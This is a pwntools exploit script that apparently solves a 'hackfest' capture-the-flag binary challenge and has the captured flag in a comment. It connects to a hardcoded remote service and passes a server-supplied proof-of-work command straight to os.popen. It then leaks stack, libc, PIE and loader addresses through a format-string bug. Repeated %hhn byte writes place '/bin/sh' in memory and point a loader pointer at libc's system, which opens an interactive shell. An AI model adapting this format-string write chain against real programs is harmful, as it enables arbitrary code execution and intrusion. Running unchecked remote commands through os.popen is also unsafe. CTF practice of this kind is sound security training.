#!/usr/bin/env python
from pwn import *
from time import sleep
import os

exe = ELF("./main")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

sshc = None
r = None
nc = "nc 20.7.158.184 1339"#172.17.0.2 5000"#
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0.8

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
        
        r.recvuntil(b"proof of work: ")
        cmd = r.readline().decode().strip()
        poc = os.popen(cmd).read().strip()
        r.sendline(poc)
        #r.readline()
        #r.interactive()
        #r.readline()
    
    return r


def writeByteInAdr(adr, data):
    b = (112-7 + data)%256
    
    ps = [b"%p"]*55
    ps[54] = b"%hhn"
    payload = b"." * b
    payload += b"".join(ps)
    payload += b"."*(256 - b)
    payload += b"."*8 # Padding
    payload += p64(adr)
    payload += p64(0xcafebabe)
    
    sendl(payload)


def writeQWORD(adr, data):
    data = p64(data)
    for idx, b in enumerate(list(data)): # 
        writeByteInAdr(adr+idx, b)


def main():
    global r
    r = conn()
    
    payload = b"%p."*178
    
    sendl(payload)
    
    r.readline()
    leak = r.readline().decode().split(".")
    
    stack_leak, libc_leak, pie_leak, ld_base = int(leak[0], 16), int(leak[5], 16), int(leak[-2], 16), int(leak[4], 16)-0x11d60
    logh("stack_leak", stack_leak)
    logh("libc_leak", libc_leak)
    logh("pie_leak", pie_leak)
    logh("ld_base", ld_base)
    
    libc_base = libc_leak - 0x11ea0
    pie_base = pie_leak - 0x1120
    counter = stack_leak + 0xc - 0x10
    call_gadget = ld_base + 0x11f68
    
    logh("libc_base", libc_base)
    logh("pie_base", pie_base)
    logh("counter adr", counter)
    logh("call_gadget", call_gadget)
    
    pie_base_ptr = ld_base + 0x2f190 
    rdi_adr = ld_base + 0x2e968
    
    logh("rdi_adr", rdi_adr)
    logh("pie_base_ptr", pie_base_ptr)
    controlled_ptr = stack_leak + 0x170 + 0x200
    logh("controlled_ptr", controlled_ptr)
    
    # target offset: 0x5038
    
    writeByteInAdr(counter+3, 0xf0)
    
    #pause()
    for idx, c in enumerate(list("/bin/sh")):
        writeByteInAdr(rdi_adr+idx, ord(c))
    
    offset = controlled_ptr - 0x3d90
    logh("offset", offset)
    
    writeQWORD(pie_base_ptr, offset)
    writeQWORD(controlled_ptr, libc_base+libc.symbols.system)
    
    # Set back counter to positive to end loop
    writeByteInAdr(counter+3, 0) # hackfest{375b68ef0a0ea3f7f752932a7f39eb1bfbe01d91c5bf87f1013d49008b941332}
    r.interactive()


if __name__ == "__main__":
    main()

